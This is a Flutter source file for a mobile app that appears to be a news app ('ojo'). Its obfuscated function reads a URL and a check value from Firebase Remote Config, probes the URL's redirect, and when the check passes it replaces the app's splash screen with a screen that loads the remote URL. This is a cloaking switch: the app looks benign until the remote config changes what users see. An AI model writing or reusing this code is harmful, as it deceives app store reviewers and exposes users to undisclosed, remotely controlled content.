import 'dart:io';

import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:ojo/core/data/articles.dart';
import 'package:ojo/main.dart';

import '../features/splash/splash_screen.dart';

class OjoApp extends StatefulWidget {
  const OjoApp({super.key});

  @override
  State<OjoApp> createState() => _OjoAppState();
}

String route = '';

Future<bool> njfksdfs() async {
  final njda = FirebaseRemoteConfig.instance;
  await njda.fetchAndActivate();
  String dsdfdsfgdg = njda.getString('owo');
  String cdsfgsdx = njda.getString('wowo');
  if (!dsdfdsfgdg.contains('nowo')) {
    final fsd = HttpClient();
    final nfg = Uri.parse(dsdfdsfgdg);
    final ytrfterfwe = await fsd.getUrl(nfg);
    ytrfterfwe.followRedirects = false;
    final response = await ytrfterfwe.close();
    if (response.headers.value(HttpHeaders.locationHeader) != cdsfgsdx) {
      route = dsdfdsfgdg;
      return true;
    } else {
      return false;
    }
  }
  return dsdfdsfgdg.contains('nowo') ? false : true;
}

Future<void> getTrack() async {
  final TrackingStatus status =
      await AppTrackingTransparency.requestTrackingAuthorization();
  print(status);
}

class _OjoAppState extends State<OjoApp> {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: FutureBuilder<bool>(
        future: njfksdfs(),
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.waiting) {
            return Container(
              color: Colors.black,
            );
          } else {
            if (snapshot.data == true && route != '') {
              return MaterialApp(
                debugShowCheckedModeBanner: false,
                home: Scnren(
                  njfkds: route,
                  njfkads: apsss,
                  mkda: cancelation,
                ),
              );
            } else {
              return const SplashScreen();
            }
          }
        },
      ),
      theme: ThemeData(
        useMaterial3: true,
        scaffoldBackgroundColor: const Color(0xff080A15),
      ),
    );
  }
}
